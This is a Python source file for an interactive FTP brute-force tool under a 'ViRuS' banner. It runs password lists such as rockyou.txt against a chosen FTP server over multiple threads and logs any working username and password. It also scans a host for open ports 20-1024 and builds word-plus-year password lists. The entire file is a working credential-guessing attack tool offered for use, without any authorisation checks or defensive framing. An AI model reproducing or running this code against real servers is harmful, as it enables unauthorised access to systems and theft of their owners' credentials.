import ftplib
import time
import os
from tqdm import tqdm  # For progress bar
import threading  # For multithreading
import socket

# Global Variables
LOG_FILE = "ftp_bruteforce_log.txt"

def show_banner():
    """Display the banner."""
    banner = r"""
                       ______
                    .-"      "-.
                   /  *ViRuS*   \
       _          |              |          _    
      ( \         |,  .-.  .-.  ,|         / )
       > "=._     | )(_0_/\_0_)( |     _.=" <    
      (_/"=._"=._ |/     /\     \| _.="_.="\_)    
             "=._ (_     ^^     _)"_.="
                 "=\__|IIIIII|__/="
                _.="| \IIIIII/ |"=._   
      _     _.="_.="\          /"=._"=._     _    
     ( \_.="_.="     `--------`     "=._"=._/ )
      > _.="                            "=._ <
     (_/                                    \_)
 ____________________________________________________
 ----------------------------------------------------        
        #  BruteForce FTP Server
        #  Author : The-Real-Virus
        #  https://github.com/The-Real-Virus
 ____________________________________________________
 ----------------------------------------------------
"""
    print(banner)

def log_result(message):
    """Log results to a file."""
    with open(LOG_FILE, "a") as log:
        log.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

def generate_wordlist(base_word, years):
    """Generate a simple wordlist by combining a base word with years."""
    wordlist = []
    for year in years:
        wordlist.append(base_word + str(year))
        wordlist.append(base_word + "@" + str(year))
    return wordlist

def test_ftp_credentials(ip_address, username, password, timeout=5):
    """Test FTP credentials."""
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip_address, timeout=timeout)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except Exception as e:
        print(f"\n[!] Error: {e}")
        return None

def brute_force(ip_address, username, password_file, delay=0, threads=1):
    """Perform brute-force attack on the FTP server."""
    try:
        with open(password_file, 'r', encoding='latin-1') as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print(f"[!] Error: Password file '{password_file}' not found.")
        return
    except UnicodeDecodeError:
        print(f"[!] Error: Invalid character encoding in '{password_file}'. Try using a different encoding or fix the file.")
        return

    print(f"\n[*] Target FTP Server: {ip_address}")
    print(f"[*] Username: {username}")
    print(f"[*] Passwords loaded: {len(passwords)}\n")
    time.sleep(1)

    def worker(start, end):
        """Worker thread to test passwords in a range."""
        for count, password in enumerate(passwords[start:end], start=start+1):
            print(f"[{count}/{len(passwords)}] Trying password: {password}", end="\r")
            result = test_ftp_credentials(ip_address, username, password)
            if result is True:
                print(f"\n\n[+] Success! Password found: {password}")
                print(f"[+] Login successful for user '{username}' with password '{password}'")
                log_result(f"Success! Username: {username}, Password: {password}")
                os._exit(0)
            elif result is None:
                break
            if delay:
                time.sleep(delay)
        print("\n[-] Brute-force attack completed. No valid password found.")
        log_result("Brute-force attack completed. No valid password found.")

    # Multithreading
    chunk_size = len(passwords) // threads
    threads_list = []
    for i in range(threads):
        start = i * chunk_size
        end = start + chunk_size if i < threads - 1 else len(passwords)
        t = threading.Thread(target=worker, args=(start, end))
        threads_list.append(t)
        t.start()

    for t in threads_list:
        t.join()

def scan_ports(ip_address):
    """Scan for open FTP ports."""
    print(f"\n[*] Scanning ports on {ip_address}...")
    for port in tqdm(range(20, 1025), desc="Scanning Ports"):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip_address, port))
            if result == 0:
                print(f"[+] Port {port} is open!")
                log_result(f"Port {port} open on {ip_address}")
            sock.close()
        except Exception as e:
            print(f"[!] Error during port scanning: {e}")

def interactive_menu():
    """Interactive menu for the FTP brute-force tool."""
    while True:
        show_banner()
        choice = input("\nPress 'y' to continue or 'n' to exit: ").strip().lower()
        if choice == 'n':
            print("\nExiting the script. Goodbye!")
            break
        elif choice == 'y':
            os.system('clear' if os.name == 'posix' else 'cls')  # Clear screen for better experience
            print("""
            [1] Start Brute-Force Attack
            [2] Scan for Open FTP Ports
            [3] Generate Custom Wordlist
            [4] View Attack Log
            [5] Exit
            """)

            choice = input("Enter your choice: ").strip()
            if choice == "1":
                ip_address = input("\nEnter the FTP server IP address or domain (e.g., 192.168.1.1): ").strip()
                username = input("Enter the username to brute-force (e.g., admin): ").strip()
                password_file = input("Enter the path to the password file (e.g., rockyou.txt): ").strip()
                delay = float(input("Enter delay between attempts in seconds (0 for no delay): ").strip() or 0)
                threads = int(input("Enter the number of threads to use (default 1): ").strip() or 1)
                brute_force(ip_address, username, password_file, delay=delay, threads=threads)
            elif choice == "2":
                ip_address = input("\nEnter the IP address to scan for open ports: ").strip()
                scan_ports(ip_address)
            elif choice == "3":
                base_word = input("\nEnter a base word (e.g., admin): ").strip()
                years = list(map(int, input("Enter years separated by spaces (e.g., 2020 2021 2022): ").split()))
                wordlist = generate_wordlist(base_word, years)
                wordlist_file = input("Enter the filename to save the wordlist (e.g., custom_wordlist.txt): ").strip()
                with open(wordlist_file, "w") as file:
                    file.write("\n".join(wordlist))
                print(f"[+] Wordlist saved to {wordlist_file}")
            elif choice == "4":
                print("\n[+] Attack Log:")
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, "r") as log:
                        print(log.read())
                else:
                    print("[!] No log file found.")
            elif choice == "5":
                print("\nExiting the script. Goodbye!")
                break
            else:
                print("\nInvalid choice. Please try again.")
        else:
            print("\nInvalid choice. Exiting the script.")

if __name__ == "__main__":
    interactive_menu()
